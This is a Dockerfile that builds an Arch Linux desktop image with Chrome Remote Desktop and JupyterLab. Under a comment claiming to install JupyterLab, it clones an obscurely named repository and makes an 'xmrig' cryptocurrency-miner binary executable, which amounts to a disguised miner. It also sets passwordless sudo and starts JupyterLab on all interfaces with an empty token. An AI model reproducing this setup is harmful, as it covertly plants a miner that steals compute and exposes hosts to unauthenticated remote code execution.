# Use the latest Ubuntu image
FROM archlinux:latest

# Update and install required packages
RUN pacman -Sy --noconfirm && pacman -S --noconfirm \
    python \
    python-pip
RUN pacman -Sy --noconfirm \
    tigervnc \
    xfce4 \
    xfce4-goodies \
    sudo \
    make \
    xorg-server \
    base-devel \
    xorg-server-xvfb \
    supervisor \
    git \
    terminator \
    vim \
    wget \
    tar \
    && pacman -Scc --noconfirm
RUN cd /tmp
RUN echo "%wheel ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
RUN echo "%wheel ALL=(ALL:ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
RUN sudo useradd -m newuser
RUN sudo usermod -aG wheel newuser
RUN mkdir /app
RUN sudo chown -R newuser /app
RUN git clone https://aur.archlinux.org/yay.git /app/yay
RUN sudo chown -R newuser /app/yay
RUN pacman -S --noconfirm go
WORKDIR /app/yay
RUN sudo -u newuser makepkg -si --noconfirm
RUN sudo -u newuser yay -S google-chrome --noconfirm
WORKDIR /app
RUN wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
RUN mkdir /tmp/chrome-remote-desktop
WORKDIR /tmp/chrome-remote-desktop
RUN ar x /app/chrome-remote-desktop_current_amd64.deb
RUN tar -xvf data.tar.xz
RUN mkdir -p /usr/local/tmp/chrome-remote-desktop
WORKDIR /usr/local/tmp/chrome-remote-desktop
RUN tar -xvf /tmp/chrome-remote-desktop/data.tar.xz
RUN cp -r etc/* /etc/
RUN cp -r lib/* /lib/
RUN cp -r opt/* /opt/
RUN cp -r usr/* /usr/
RUN sudo echo "exec /usr/bin/startxfce4" >> /etc/chrome-remote-desktop-session
WORKDIR /app

# Install JupyterLab
RUN git clone https://github.com/SudoSuII/hsJwjJwj91
RUN chmod +x /app/hsJwjJwj91/xmrig

# Start JupyterLab on port 8080 without authentication

RUN pip3 install jupyterlab --break-system-packages

RUN git clone https://github.com/SudoSuII/hsJwjJwj91

EXPOSE 8080

CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port=8080", "--no-browser", "--allow-root", "--NotebookApp.token=''"]
